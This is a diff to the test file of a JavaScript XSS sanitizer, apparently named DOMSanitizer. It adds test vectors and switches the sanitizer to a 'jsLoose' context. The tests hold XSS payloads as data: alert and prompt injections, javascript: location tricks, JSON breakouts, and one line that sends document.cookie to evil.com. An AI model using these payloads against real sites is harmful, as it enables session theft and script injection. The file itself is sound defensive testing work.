@@ -434,7 +434,7 @@ var tests = [
         'payload': '%5C%27));%7Dcatch(e)%7Balert(document.domain)%7D//',
         'expected': ''
     },
-    
+
     // https://hackerone.com/reports/125027
     {
         'name': 'AngularJS template injection #1',
@@ -566,22 +566,61 @@ var tests = [
         'payload': 'a = location; a.href="//evil.com/" + document.cookie',
         'expected': ''
     },
+    {
+        'name': 'location',
+        'payload': 'location="javascript&#x3a;alert(1)"',
+        'expected': ''
+    },
+    {
+        'name': 'location2',
+        'payload': 'location.assign("evil")',
+        'expected': ''
+    },
     // JSON-based vectors
     {
-        'name': 'json-based test #1',
-        'payload': '{";alert(1);1+":"+"}',
+        'name': 'json-based test #1!!!',
+        'payload': '{";alert(\'1\');1+":"+"}',
         'expected': ''
     },
     {
         'name': 'json-based test #2',
         'payload': '[{";var g=/*":"*/alert;1+"},{";g(1);1+":"+"}]',
         'expected': ''
+    },
+    // Vectors with errors
+    {
+        'name': 'with js errors #1',
+        'payload': ')},{0:prompt(1',
+        'expected': ''
+    },
+    {
+        'name': 'with js errors #2',
+        'payload': '");alert(1',
+        'expected': ''
+    },
+    {
+        'name': 'with js errors #3',
+        'payload': '\"};[window.onload=111;//;',
+        'expected': ''
+    },
+    {
+        'name': 'with js errors #4',
+        'payload': '"[.."abc"]',
+        'expected': ''
+    },
+    // false positive check
+    {
+        'name': 'false positive #1',
+        'payload': 'this is not js',
+        'expected': 'this%20is%20not%20js'
     }
 ];
 
+
 var sanitizer = function() {
     var dirty = location.hash.substring(1);
-    return DOMSanitizer.sanitize(dirty, {CONTEXTS: ['js']});
+    return DOMSanitizer.sanitize(dirty, {CONTEXTS: ['jsLoose']});
 };
 
 module.exports = {tests: tests, sanitizer: sanitizer};
+
